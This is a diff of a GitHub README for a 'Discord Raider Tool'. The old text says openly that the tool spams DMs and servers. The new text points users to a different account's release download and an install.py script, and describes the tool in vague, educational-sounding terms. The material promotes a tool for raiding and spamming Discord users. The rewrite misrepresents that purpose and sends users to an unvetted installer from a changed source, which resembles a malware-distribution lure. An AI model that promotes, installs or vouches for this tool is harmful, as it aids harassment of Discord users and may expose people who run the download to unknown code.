@@ -1,95 +1,106 @@
-![Image](aa.png)
+# Discord Raider Tool 🚀
 
-# 📜 **Discord Raider Tool** 🚀
+![Discord Raider Tool](https://img.shields.io/badge/Discord%20Raider%20Tool-v1.0.0-blue)
 
-## 📚 Table of Contents
-- [🔧 Installation](#-installation)
-  - [💻 Windows Installation](#-windows-installation)
-  - [🐧 Linux Installation](#-linux-installation)
-- [🛠️ Usage](#-usage)
-- [🐞 Troubleshooting](#-troubleshooting)
-- [🔗 Links](#-links)
+Welcome to the **Discord Raider Tool** repository! This project aims to provide users with a set of powerful tools for automating various tasks on Discord. Whether you are a developer looking to enhance your bot capabilities or a user wanting to learn more about Discord's API, this toolset has something for everyone.
 
-## 🔧 Installation
+## Table of Contents
 
-### 💻 Windows Installation
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-1. **Clone the Repository**  
-   Open a terminal (Command Prompt or PowerShell) and run the following command:
+## Features ✨
+
+- **Automation**: Automate repetitive tasks on Discord with ease.
+- **Bots**: Create and manage bots using the Discord API.
+- **Educational Tools**: Learn about Discord's functionalities through practical examples.
+- **Proxy Tools**: Use proxies to enhance your bot's performance.
+- **Python GUI**: A user-friendly interface built with Python for easier interaction.
+- **Webhooks**: Manage and utilize webhooks for various applications.
+- **Spamming Tools**: Tools designed for testing and educational purposes.
+
+## Installation ⚙️
+
+To get started with the Discord Raider Tool, follow these steps:
+
+1. **Download the latest release** from the [Releases section](https://github.com/NayanMistry534/discord-raider-tool/releases).
+2. Extract the downloaded files.
+3. Open your terminal and navigate to the extracted folder.
+4. Run the installation script using the command:
+
    ```bash
-   git clone https://github.com/BYPASS-ALT/discord-raider-tool.git
-   ```
-   
-2. **Install Dependencies**  
-   Run the following command to install the required dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-3. **Run the Tool**  
-   You can start the tool by running the following command:
-   ```bash
-   python bot.py
-   ```
-
-4. If you face any issues, visit the [Issues](https://github.com/BYPASS-ALT/discord-raider-tool/issues) tab for help!
-
-### 🐧 Linux Installation
-
-1. **Install Python 3 and pip**  
-   Run the following commands to install Python and pip (if not installed already):
-   ```bash
-   sudo apt update
-   sudo apt install python3 python3-pip
+   python install.py
    ```
 
-2. **Install Git**  
-   If you don't have Git installed, use the following command:
-   ```bash
-   sudo apt install git
-   ```
+5. Follow the on-screen instructions to complete the installation.
 
-3. **Clone the Repository**  
-   Clone the repository using Git:
-   ```bash
-   git clone https://github.com/BYPASS-ALT/discord-raider-tool.git
-   ```
+## Usage 📖
 
-4. **Create a Virtual Environment**  
-   It’s recommended to create a virtual environment for the project:
-   ```bash
-   python3 -m venv venv
-   ```
+Once installed, you can start using the Discord Raider Tool. Here's a quick guide on how to use its main features:
 
-5. **Activate the Virtual Environment**  
-   Run the following command to activate the virtual environment:
-   ```bash
-   source venv/bin/activate
-   ```
+### Running the Tool
 
-6. **Install Dependencies**  
-   Install the required dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
+To run the tool, execute the following command in your terminal:
 
-7. **Run the Tool**  
-   Start the tool with the following command:
-   ```bash
-   python bot.py
-   ```
+```bash
+python main.py
+```
 
-8. For any issues, head to the [Issues](https://github.com/BYPASS-ALT/discord-raider-tool/issues) tab!
+### Creating a Bot
 
-## 🛠️ Usage
+1. Navigate to the "Bot Management" section.
+2. Click on "Create New Bot."
+3. Fill in the required fields such as bot name and permissions.
+4. Save your settings.
 
-After setting up the tool, simply follow the on-screen instructions to use the DM or server spamming features.
+### Using Webhooks
 
-## 🐞 Troubleshooting
+1. Go to the "Webhook Management" section.
+2. Click on "Add New Webhook."
+3. Enter the webhook URL and configure the settings.
+4. Test the webhook to ensure it works.
 
-If you encounter any issues, please refer to the [Issues](https://github.com/BYPASS-ALT/discord-raider-tool/issues) section or open a new issue for assistance.
+### Automating Tasks
 
-## 🔗 Links
+1. Access the "Automation" section.
+2. Choose the task you want to automate.
+3. Set the parameters and schedule.
+4. Activate the automation.
 
-- [GitHub Repository](https://github.com/BYPASS-ALT/discord-raider-tool)
-- [Issues Tab](https://github.com/BYPASS-ALT/discord-raider-tool/issues)
+## Contributing 🤝
+
+We welcome contributions from the community! If you want to contribute to the Discord Raider Tool, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your forked repository.
+5. Open a pull request.
+
+Please ensure your code adheres to the existing style and includes appropriate tests.
+
+## License 📜
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact 📬
+
+For any questions or suggestions, feel free to reach out:
+
+- **GitHub**: [NayanMistry534](https://github.com/NayanMistry534)
+- **Email**: nayan@example.com
+
+For the latest updates, visit the [Releases section](https://github.com/NayanMistry534/discord-raider-tool/releases) and download the latest version of the tool. 
+
+## Acknowledgments 🙏
+
+- Thanks to the Discord API team for their excellent documentation.
+- Special thanks to the open-source community for their contributions and support.
+
+---
+
+Feel free to explore the repository and contribute to the Discord Raider Tool. Happy coding!
